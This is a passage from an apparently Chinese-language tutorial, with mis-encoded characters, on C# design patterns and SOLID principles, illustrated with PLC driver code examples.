        _adaptee.SpecificRequest(); <span class="hljs-comment">// å§”æ‰˜ç»™è¢«é€‚é…å¯¹è±¡</span>
        Console.WriteLine(<span class="hljs-string">"Adapter: åœ¨è°ƒç”¨åå¯åšä¸€äº›åå¤„ç†"</span>);
    }
}

<span class="hljs-comment">// å®¢æˆ·ç«¯ä½¿ç”¨</span>
ITarget target = <span class="hljs-keyword">new</span> Adapter(<span class="hljs-keyword">new</span> Adaptee());
target.Request();
</code></pre>
<p>ä¸å…¶å®ƒæ¨¡å¼çš„åŒºåˆ«ï¼ˆç®€çŸ­ï¼‰</p>
<ul>
<li>è£…é¥°å™¨ï¼ˆDecoratorï¼‰ï¼šä¹Ÿæ˜¯åŒ…ä¸€å±‚ï¼Œä½†ç›®çš„æ˜¯â€œå¢å¼º/æ‰©å±•è¡Œä¸ºâ€ï¼Œå¹¶ä¸”è£…é¥°å™¨é€šå¸¸ä¿ç•™å¹¶é€ä¼ åŸæ¥å£çš„è¡Œä¸ºï¼›é€‚é…å™¨æ˜¯æ”¹å˜æ¥å£ï¼Œè®©ä¸å…¼å®¹çš„æ¥å£èƒ½å·¥ä½œã€‚ä¸¤è€…ç»“æ„ç›¸ä¼¼ï¼Œä½†æ„å›¾ä¸åŒã€‚</li>
<li>ä»£ç†ï¼ˆProxyï¼‰ï¼šæ§åˆ¶å¯¹å¯¹è±¡çš„è®¿é—®ï¼ˆæ¯”å¦‚å»¶è¿ŸåŠ è½½ã€æƒé™æ£€æŸ¥ï¼‰ï¼Œæ„å›¾ä¸åŒï¼›ä»£ç†é€šå¸¸ä¸ç›®æ ‡æ¥å£å®Œå…¨ä¸€è‡´å¹¶æŠŠè°ƒç”¨è½¬å‘ç»™çœŸå®å¯¹è±¡ã€‚</li>
<li>é€‚é…å™¨ vs æ¡¥ï¼ˆBridgeï¼‰ï¼šæ¡¥æ¨¡å¼ç”¨äºæŠŠæŠ½è±¡ä¸å®ç°åˆ†ç¦»ä»¥ç‹¬ç«‹æ‰©å±•ï¼Œé€‚é…å™¨ç”¨äºå…¼å®¹æ¥å£ã€‚</li>
</ul>
<p>æ³¨æ„äº‹é¡¹ä¸å»ºè®®</p>
<ul>
<li>ä¼˜å…ˆç”¨å¯¹è±¡é€‚é…å™¨ï¼ˆæ˜ç¡®å®šä¹‰è½¬æ¢ç‚¹ã€å¯åœ¨è¿è¡Œæ—¶ä¼ å…¥ä¸åŒè¢«é€‚é…å¯¹è±¡ï¼‰ã€‚</li>
<li>å¦‚æœéœ€è¦é€‚é…å¤šä¸ªä¸åŒæ¥å£åˆ°åŒä¸€ä¸ªç›®æ ‡ï¼Œè€ƒè™‘å†™ä¸åŒçš„é€‚é…å™¨ç±»æˆ–ä½¿ç”¨é€šç”¨è½¬æ¢å±‚ã€‚</li>
<li>é€‚é…å™¨ä¸åº”åŒ…å«å¤æ‚ä¸šåŠ¡é€»è¾‘ï¼Œä¸»è¦è´Ÿè´£æ¥å£/åè®®æˆ–æ•°æ®æ ¼å¼è½¬æ¢ï¼›å¤æ‚é€»è¾‘åº”æ”¾åˆ°æ›´åˆé€‚çš„å±‚æ¬¡ã€‚</li>
</ul>
<p>å¸¸è§ç°å®ä¾‹å­</p>
<ul>
<li>æŠŠè€ API åŒ…è£…æˆæ–°æ¥å£ï¼ˆä¾‹å¦‚æŠŠæ—§æ•°æ®åº“è®¿é—®ç±»é€‚é…æˆæ–°çš„ä»“å‚¨æ¥å£ IRepositoryï¼‰ã€‚</li>
<li>å°†ä¸åŒæ—¥å¿—åº“é€‚é…æˆç»Ÿä¸€ ILogger æ¥å£ã€‚</li>
<li>åœ¨ç³»ç»Ÿé›†æˆä¸­æŠŠä¸åŒæ ¼å¼çš„æ•°æ®è½¬æ¢ï¼ˆXML -&gt; å¯¹è±¡ -&gt; JSON æ¥å£ç­‰ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-76">ç­–ç•¥æ¨¡å¼</h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>ç­–ç•¥æ¨¡å¼ï¼šæŠŠâ€œå¯æ›¿æ¢çš„ç®—æ³•/è¡Œä¸ºâ€æŠ½æˆæ¥å£ï¼ˆç­–ç•¥ï¼‰ï¼Œåœ¨è¿è¡Œæ—¶é€‰æ‹©/åˆ‡æ¢ä¸åŒå®ç°ï¼›è°ƒç”¨æ–¹åªä¾èµ–æŠ½è±¡ï¼Œä¸ä¾èµ–å…·ä½“ç­–ç•¥ã€‚</li>
</ul>
<p>ä»€ä¹ˆæ—¶å€™ç”¨ï¼ˆå¾ˆé‡è¦ï¼‰</p>
<ul>
<li>æœ‰ä¸€ç»„åŒç±»è¡Œä¸ºï¼šå†™æ³•ä¸åŒã€ç›®æ ‡ç›¸åŒï¼ˆä¾‹å¦‚ä¸åŒ PLC åè®®çš„ Read/Writeï¼‰ã€‚</li>
<li>ä½ å¸Œæœ›æ–°å¢ä¸€ç§è¡Œä¸ºæ—¶ï¼šåªâ€œåŠ ç±»â€ï¼Œä¸æ”¹è°ƒç”¨æ–¹ï¼ˆç¬¦åˆ OCPï¼‰ã€‚</li>
<li>ä½ å¸Œæœ›å•å…ƒæµ‹è¯•æ—¶èƒ½æ›¿æ¢è¡Œä¸ºï¼ˆMock/Fakeï¼‰ã€‚</li>
</ul>
<p>ä¸å·¥å‚/é€‚é…å™¨çš„å…³ç³»</p>
<ul>
<li>Strategy è§£å†³â€œè¡Œä¸ºå¯æ›¿æ¢â€ï¼›</li>
<li>Factory è§£å†³â€œåˆ›å»ºå“ªä¸€ä¸ªç­–ç•¥â€ï¼›</li>
<li>Adapter è§£å†³â€œæŠŠç¬¬ä¸‰æ–¹åº“çš„æ¥å£å˜æˆä½ çš„ç­–ç•¥æ¥å£â€ã€‚</li>
</ul>
<p>PLC/HSL è´¯ç©¿ç¤ºä¾‹ï¼šç”¨ç­–ç•¥æŠ½è±¡ä¸åŒåè®®é©±åŠ¨</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPlcDriver</span>
{
    <span class="hljs-built_in">string</span> Protocol { <span class="hljs-keyword">get</span>; }
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span>()</span>;
    <span class="hljs-function">T <span class="hljs-title">Read</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Write</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address, T <span class="hljs-keyword">value</span></span>)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PlcClient</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPlcDriver _driver;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PlcClient</span>(<span class="hljs-params">IPlcDriver driver</span>)</span> =&gt; _driver = driver;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span>()</span> =&gt; _driver.Connect();
    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">Read</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span> =&gt; _driver.Read&lt;T&gt;(address);
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address, T <span class="hljs-keyword">value</span></span>)</span> =&gt; _driver.Write(address, <span class="hljs-keyword">value</span>);
}

<span class="hljs-comment">// ä¸šåŠ¡å±‚ï¼šåªä¾èµ– IPlcDriverï¼Œä¸ä¾èµ–å…·ä½“åè®®</span>
<span class="hljs-comment">// IPlcDriver driver = new S7Driver(...); æˆ– new ModbusTcpDriver(...);</span>
<span class="hljs-comment">// var client = new PlcClient(driver);</span>
</code></pre>
<p>å¸¸è§å‘</p>
<ul>
<li>ç­–ç•¥æ¥å£è®¾è®¡è¿‡å¤§ï¼ˆæŠŠè¿æ¥ã€è¯»å†™ã€è®¢é˜…ã€æ‰¹é‡ã€è¯Šæ–­å…¨å¡è¿›å»ï¼‰ä¼šå¯¼è‡´å®ç°ç±»ç—›è‹¦ï¼›å»ºè®®æŒ‰èŒè´£æ‹†å°æ¥å£æˆ–æŒ‰é˜¶æ®µæ¼”è¿›ã€‚</li>
<li>ä¸è¦ä¸ºäº†â€œç”¨æ¨¡å¼â€è€Œç¡¬å¥—ï¼šå¦‚æœåªæœ‰ä¸€ä¸ªå®ç°ä¸”ä¸ä¼šå¢åŠ ï¼Œå…ˆåˆ«æŠ½æ¥å£ã€‚</li>
</ul>
<h2 data-id="heading-77">Provideræ¨¡å¼ï¼ˆProvider Pattern)</h2>
<blockquote>
<p>å¯ä»¥æŸ¥å¾®è½¯çš„â€œProvider Patternâ€æ–‡æ¡£æˆ–è€…çœ‹ã€ŠDependency Injection in .NETã€‹è¿™ç±»ä¹¦ã€‚</p>
<p>å®ƒå’ŒDIï¼ˆä¾èµ–æ³¨å…¥ï¼‰ç»“åˆç´§å¯†ï¼Œä¸æ˜¯çº¯è®¾è®¡æ¨¡å¼ã€‚</p>
</blockquote>
<h2 data-id="heading-78"><strong>è§‚å¯Ÿè€…æ¨¡å¼</strong></h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>è§‚å¯Ÿè€…æ¨¡å¼ï¼šå½“ä¸€ä¸ªå¯¹è±¡ï¼ˆSubjectï¼‰çŠ¶æ€å˜åŒ–æ—¶ï¼Œè‡ªåŠ¨é€šçŸ¥ä¸€ç»„è®¢é˜…è€…ï¼ˆObserverï¼‰ã€‚åœ¨ .NET é‡Œæœ€å¸¸è§çš„è½åœ°å°±æ˜¯äº‹ä»¶ï¼ˆeventï¼‰/å§”æ‰˜ï¼ˆdelegateï¼‰ï¼Œä»¥åŠ <code>IObservable&lt;T&gt;</code>ã€‚</li>
</ul>
<p>ä»€ä¹ˆæ—¶å€™ç”¨</p>
<ul>
<li>è¿æ¥çŠ¶æ€å˜åŒ–ï¼ˆæ–­çº¿ã€é‡è¿ã€å·²è¿æ¥ï¼‰éœ€è¦é€šçŸ¥ UI/æ—¥å¿—/å‘Šè­¦ã€‚</li>
<li>æ•°æ®å˜åŒ–ï¼ˆè½®è¯¢/è®¢é˜…ï¼‰éœ€è¦æŠŠå˜åŒ–æ¨é€åˆ°å¤šä¸ªå¤„ç†æ¨¡å—ã€‚</li>
</ul>
<p>.NET äº‹ä»¶ç‰ˆï¼ˆæœ€å¸¸ç”¨ã€æœ€æ˜“è½åœ°ï¼‰</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-built_in">enum</span> ConnectionState { Disconnected, Connecting, Connected, Faulted }

<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ConnectionStateChangedEventArgs</span> : <span class="hljs-title">EventArgs</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConnectionStateChangedEventArgs</span>(<span class="hljs-params">ConnectionState state, <span class="hljs-built_in">string</span>? reason = <span class="hljs-literal">null</span></span>)</span>
    {
        State = state;
        Reason = reason;
    }

    <span class="hljs-keyword">public</span> ConnectionState State { <span class="hljs-keyword">get</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span>? Reason { <span class="hljs-keyword">get</span>; }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PlcConnectionMonitor</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">event</span> EventHandler&lt;ConnectionStateChangedEventArgs&gt;? StateChanged;

    <span class="hljs-keyword">private</span> ConnectionState _state = ConnectionState.Disconnected;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetState</span>(<span class="hljs-params">ConnectionState state, <span class="hljs-built_in">string</span>? reason = <span class="hljs-literal">null</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (_state == state) <span class="hljs-keyword">return</span>;
        _state = state;
        StateChanged?.Invoke(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">new</span> ConnectionStateChangedEventArgs(state, reason));
    }
}

<span class="hljs-comment">// è®¢é˜…è€…ï¼ˆä¾‹å¦‚ UI / æ—¥å¿—ï¼‰</span>
<span class="hljs-comment">// monitor.StateChanged += (_, e) =&gt; Console.WriteLine($"State: {e.State}, reason={e.Reason}");</span>
</code></pre>
<p>å¸¸è§å‘</p>
<ul>
<li>äº‹ä»¶è®¢é˜…æ²¡å–æ¶ˆä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼ˆç‰¹åˆ«æ˜¯é•¿ç”Ÿå‘½å‘¨æœŸå¯¹è±¡è®¢é˜…çŸ­ç”Ÿå‘½å‘¨æœŸå¯¹è±¡ï¼Œæˆ–åè¿‡æ¥ï¼‰ã€‚</li>
<li>é€šçŸ¥é‡Œåšé‡é€»è¾‘ä¼šé˜»å¡å‘å¸ƒè€…çº¿ç¨‹ï¼›å¿…è¦æ—¶ç”¨é˜Ÿåˆ—/åå°ä»»åŠ¡ã€‚</li>
</ul>
<h2 data-id="heading-79">é—¨é¢æ¨¡å¼</h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>é—¨é¢æ¨¡å¼ï¼šä¸ºä¸€ç»„å¤æ‚å­ç³»ç»Ÿæä¾›ä¸€ä¸ªæ›´ç®€å•çš„ç»Ÿä¸€å…¥å£ï¼Œéšè—å¤æ‚åº¦ã€é™ä½è€¦åˆã€‚</li>
</ul>
<p>PLC/HSL åœºæ™¯ä¸ºä»€ä¹ˆå¾ˆé€‚åˆ</p>
<ul>
<li>HSL çš„å…·ä½“ç±»å¾ˆå¤šã€è¿æ¥/è¯»å†™/ç±»å‹è½¬æ¢/å¼‚å¸¸å¤„ç†åˆ†æ•£ï¼›ä¸šåŠ¡å±‚ä¸åº”è¯¥äº†è§£è¿™äº›ç»†èŠ‚ã€‚</li>
<li>ä½ å¯ä»¥ç”¨ä¸€ä¸ª <code>PlcFacade</code> å¯¹å¤–æä¾›ç»Ÿä¸€ APIï¼ŒæŠŠåè®®å·®å¼‚å’Œç»†èŠ‚ç•™åœ¨å†…éƒ¨ã€‚</li>
</ul>
<p>æœ€å°é—¨é¢ç¤ºä¾‹ï¼ˆæŠŠâ€œæ€ä¹ˆè¿ã€æ€ä¹ˆè¯»å†™â€è—èµ·æ¥ï¼‰</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PlcFacade</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPlcDriver _driver;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PlcFacade</span>(<span class="hljs-params">IPlcDriver driver</span>)</span>
    {
        _driver = driver;
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span>()</span> =&gt; _driver.Connect();

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">ReadInt32</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span> =&gt; _driver.Read&lt;<span class="hljs-built_in">int</span>&gt;(address);
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteInt32</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> address, <span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span></span>)</span> =&gt; _driver.Write(address, <span class="hljs-keyword">value</span>);
}
</code></pre>
<p>é—¨é¢ vs é€‚é…å™¨ vs è£…é¥°å™¨ï¼ˆåˆ«æ··ï¼‰</p>
<ul>
<li>Facadeï¼šå¯¹å¤–â€œå˜ç®€å•â€ï¼Œä¸ä¸€å®šæ”¹å˜å†…éƒ¨æ¥å£ï¼›</li>
<li>Adapterï¼šå¯¹å¤–â€œå˜å…¼å®¹â€ï¼ŒæŠŠ A æ¥å£è½¬æˆ B æ¥å£ï¼›</li>
<li>Decoratorï¼šå¯¹å¤–æ¥å£ä¸å˜ï¼Œä½†â€œå¢å¼ºè¡Œä¸ºâ€ï¼ˆæ—¥å¿—/é‡è¯•/ç¼“å­˜ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-80">æ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼ˆTemplate Method Patternï¼‰</h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>æ¨¡æ¿æ–¹æ³•ï¼šçˆ¶ç±»å®šä¹‰ç¨³å®šæµç¨‹ï¼ˆç®—æ³•éª¨æ¶ï¼‰ï¼ŒæŠŠå¯å˜æ­¥éª¤ç•™ç»™å­ç±»é‡å†™ï¼ˆ<code>abstract/virtual</code>ï¼‰ï¼Œå¿…è¦æ—¶å­ç±»å¯ç”¨ <code>base</code> ä¿ç•™çˆ¶ç±»è¡Œä¸ºå†æ‰©å±•ã€‚</li>
<li>è¯¥æ–¹å¼å¸¸ç”¨äºå•æ¥å£,å¤šå®ç°å®ä¾‹æ—¶ä½¿ç”¨,æœ‰ä¸€ä¸ªæŠ½è±¡æ¨¡æ¿ç±»,æ–¹ä¾¿ç»Ÿä¸€ç®¡ç†å¤šå®ä¾‹,å¯¹å¤šå®ä¾‹ä¸­ä¸åŒçš„å®ç°æ–¹æ³•è¿›è¡ŒåŒ…è£¹trycatchç»Ÿä¸€å¤„ç†,å¢åŠ å…±åŒå­—æ®µåœ¨æ¨¡æ¿ç±»ä¸­ç›´æ¥å¤„ç†,è¾¾åˆ°å®ç°å®ä¾‹ä¸­åªå†™ä¸åŒçš„å®ä¾‹æ–¹æ³•</li>
</ul>
<p>ä»€ä¹ˆæ—¶å€™ç”¨</p>
<ul>
<li>å¤šä¸ªé©±åŠ¨çš„â€œæµç¨‹ä¸€è‡´ã€æ­¥éª¤ä¸åŒâ€ï¼šä¾‹å¦‚è¿æ¥å‰æ£€æŸ¥ã€è¯»å†™å‰æ ¡éªŒã€å¼‚å¸¸è½¬æ¢ã€æ—¥å¿—æ‰“ç‚¹ç­‰ã€‚</li>
</ul>
<p>PLC é©±åŠ¨æµç¨‹ç¤ºä¾‹ï¼ˆæŠ½è±¡ç±»å®šä¹‰éª¨æ¶ï¼‰</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PlcDriverBase</span> : <span class="hljs-title">IPlcDriver</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-built_in">string</span> Protocol { <span class="hljs-keyword">get</span>; }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Connect</span>()</span>
    {
        BeforeConnect();
        ConnectCore();
        AfterConnect();
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">Read</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span>
    {
        ValidateAddress(address);
        <span class="hljs-keyword">return</span> ReadCore&lt;T&gt;(address);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Write</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address, T <span class="hljs-keyword">value</span></span>)</span>
    {
        ValidateAddress(address);
        WriteCore(address, <span class="hljs-keyword">value</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BeforeConnect</span>()</span> { }
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">AfterConnect</span>()</span> { }
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ValidateAddress</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(address)) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"address is required"</span>, <span class="hljs-keyword">nameof</span>(address));
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ConnectCore</span>()</span>;
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> T <span class="hljs-title">ReadCore</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">WriteCore</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">string</span> address, T <span class="hljs-keyword">value</span></span>)</span>;
}
</code></pre>
<p>ä½¿ç”¨å»ºè®®</p>
<ul>
<li>Template Method é€‚åˆâ€œæµç¨‹ç¨³å®šâ€ï¼›å¦‚æœå˜åŒ–ç‚¹å¾ˆå¤šä¸”ç»„åˆå˜åŒ–å¤šï¼Œä¼˜å…ˆç”¨ Strategy + Decoratorï¼ˆæ›´çµæ´»ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-81">å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼Œå¯é€‰ä½†å¾ˆå®ç”¨ï¼‰</h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>å‘½ä»¤æ¨¡å¼ï¼šæŠŠä¸€æ¬¡è¯·æ±‚å°è£…æˆå¯¹è±¡ï¼ˆå‘½ä»¤ï¼‰ï¼Œä»è€Œæ”¯æŒæ’é˜Ÿã€è®°å½•ã€é‡è¯•ã€æ’¤é”€ï¼ˆæœ‰äº›é¢†åŸŸå¯æ’¤é”€ï¼‰ç­‰ã€‚</li>
</ul>
<p>PLC åœºæ™¯æ€ä¹ˆè½åœ°ï¼ˆæ’é˜Ÿ + é‡è¯•æœ€å¸¸è§ï¼‰</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPlcCommand</span>
{
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>(<span class="hljs-params">IPlcDriver driver</span>)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WriteInt32Command</span> : <span class="hljs-title">IPlcCommand</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WriteInt32Command</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> address, <span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span></span>)</span>
    {
        Address = address;
        Value = <span class="hljs-keyword">value</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Address { <span class="hljs-keyword">get</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Value { <span class="hljs-keyword">get</span>; }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>(<span class="hljs-params">IPlcDriver driver</span>)</span> =&gt; driver.Write(Address, Value);
}

<span class="hljs-comment">// åç»­å¯ä»¥åšï¼šé˜Ÿåˆ—ã€å¤±è´¥é‡è¯•ã€ç»Ÿä¸€è¶…æ—¶ã€æ‰§è¡Œç»Ÿè®¡ç­‰</span>
</code></pre>
<h2 data-id="heading-82">çŠ¶æ€æ¨¡å¼ï¼ˆState Patternï¼Œå¯é€‰ï¼‰</h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>çŠ¶æ€æ¨¡å¼ï¼šæŠŠâ€œçŠ¶æ€ç›¸å…³çš„è¡Œä¸ºâ€æ‹†åˆ°ä¸åŒçŠ¶æ€å¯¹è±¡é‡Œï¼Œè®©å¯¹è±¡åœ¨ä¸åŒçŠ¶æ€ä¸‹è¡¨ç°ä¸åŒï¼Œé¿å… if/else çŠ¶æ€æœºæ•£è½å„å¤„ã€‚</li>
</ul>
<p>PLC åœºæ™¯å¾ˆå¸¸è§çš„çŠ¶æ€</p>
<ul>
<li>Disconnected / Connecting / Connected / Faulted</li>
</ul>
<p>è½åœ°å»ºè®®ï¼ˆä»ç®€åˆ°éš¾ï¼‰</p>
<ul>
<li>ç¬¬ä¸€é˜¶æ®µï¼šç”¨ <code>enum ConnectionState</code> + å°‘é‡ if/guard å°±å¤Ÿã€‚</li>
<li>ç¬¬äºŒé˜¶æ®µï¼šå½“ä½ å‘ç°â€œæ¯ä¸ªçŠ¶æ€çš„è¡Œä¸ºå·®å¼‚å¾ˆå¤§ã€åˆ†æ”¯çˆ†ç‚¸â€ï¼Œå†å¼•å…¥ State Patternã€‚</li>
</ul>
<h2 data-id="heading-83">SOLIDï¼ˆä¸»çº¿ï¼Œæ¯”èƒŒæ¨¡å¼æ›´å…³é”®ï¼‰</h2>
<h3 data-id="heading-84">SRPï¼šå•ä¸€èŒè´£</h3>
<ul>
<li>ä¸€ä¸ªç±»åªåšä¸€ä»¶â€œå˜åŒ–åŸå› ä¸€è‡´â€çš„äº‹ã€‚</li>
<li>åœ¨ PLC å°è£…é‡Œï¼šåè®®é©±åŠ¨è´Ÿè´£â€œåè®®è¯»å†™â€ï¼›æ—¥å¿—/é‡è¯•/ç¼“å­˜ä¸è¦å¡è¿›é©±åŠ¨æ ¸å¿ƒï¼Œåº”è¯¥ç”¨ Decorator æˆ–ç‹¬ç«‹æœåŠ¡ã€‚</li>
</ul>
<h3 data-id="heading-85">OCPï¼šå¼€é—­åŸåˆ™</h3>
<ul>
<li>å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚</li>
<li>ä½ çš„ç›®æ ‡ï¼šâ€œæ–°å¢ä¸€ç§ PLC åè®®â€æ—¶ï¼Œæœ€å¥½æ˜¯åŠ ä¸€ä¸ªæ–°é©±åŠ¨ç±» + å·¥å‚æ˜ å°„/DI æ³¨å†Œï¼Œè€Œä¸æ˜¯å»æ”¹ä¸€å †ä¸šåŠ¡ if/elseã€‚</li>
</ul>
<h3 data-id="heading-86">LSPï¼šé‡Œæ°æ›¿æ¢</h3>
<ul>
<li>å­ç±»/å®ç°å¿…é¡»èƒ½æ›¿æ¢çˆ¶ç±»/æ¥å£ï¼Œä¸”ä¸ç ´åè°ƒç”¨æ–¹æœŸæœ›ã€‚</li>
<li>ä¾‹å¦‚ï¼šæŸä¸ªé©±åŠ¨å®ç°ä¸åº”è¯¥åœ¨ <code>Read&lt;T&gt;</code> é‡Œå¯¹æŸäº›åœ°å€æ‚„æ‚„è¿”å›é»˜è®¤å€¼è€Œä¸æŠ¥é”™ï¼ˆä¼šè®©ä¸Šå±‚é€»è¾‘å¾ˆéš¾æ’æŸ¥ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-87">ISPï¼šæ¥å£éš”ç¦»</h3>
<ul>
<li>ä¸è¦é€¼è¿«å®ç°ç±»ä¾èµ–å®ƒä¸éœ€è¦çš„æ–¹æ³•ã€‚</li>
<li>ç»éªŒï¼šå…ˆåšå°æ¥å£ï¼ˆè¿æ¥/è¯»/å†™/è®¢é˜…ï¼‰ï¼Œå†ç»„åˆæˆé—¨é¢ï¼›æ¯”ä¸€å¼€å§‹å°±åšâ€œå·¨æ— éœ¸ IPlcDriverâ€æ›´ç¨³ã€‚</li>
</ul>
<h3 data-id="heading-88">DIPï¼šä¾èµ–å€’ç½®</h3>
<ul>
<li>é«˜å±‚æ¨¡å—ä¸ä¾èµ–ä½å±‚æ¨¡å—ï¼ŒäºŒè€…éƒ½ä¾èµ–æŠ½è±¡ã€‚</li>
<li>ä¸šåŠ¡æœåŠ¡ä¾èµ– <code>IPlcDriver</code> / <code>PlcFacade</code>ï¼Œä¸ç›´æ¥ä¾èµ– HSL çš„å…·ä½“é€šä¿¡ç±»ã€‚</li>
</ul>
<h2 data-id="heading-89">ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰ä¸ç»„åˆä¼˜äºç»§æ‰¿ï¼ˆè½åœ°æ–¹å¼ï¼‰</h2>
<p>æ ¸å¿ƒç›®æ ‡</p>
<ul>
<li>è®©â€œé€‰æ‹©å“ªä¸ªå®ç°â€å‘ç”Ÿåœ¨å¯åŠ¨/é…ç½®é˜¶æ®µï¼Œè€Œä¸æ˜¯æ•£è½åœ¨ä¸šåŠ¡ä»£ç é‡Œã€‚</li>
</ul>
<p>å…¸å‹åšæ³•ï¼ˆä¼ªä»£ç ï¼Œå±•ç¤ºæ€è·¯ï¼‰</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// æ³¨å†Œï¼šæŠŠæŠ½è±¡æ˜ å°„åˆ°å…·ä½“å®ç°</span>
<span class="hljs-comment">// services.AddSingleton&lt;IPlcDriver, HslS7Driver&gt;();</span>
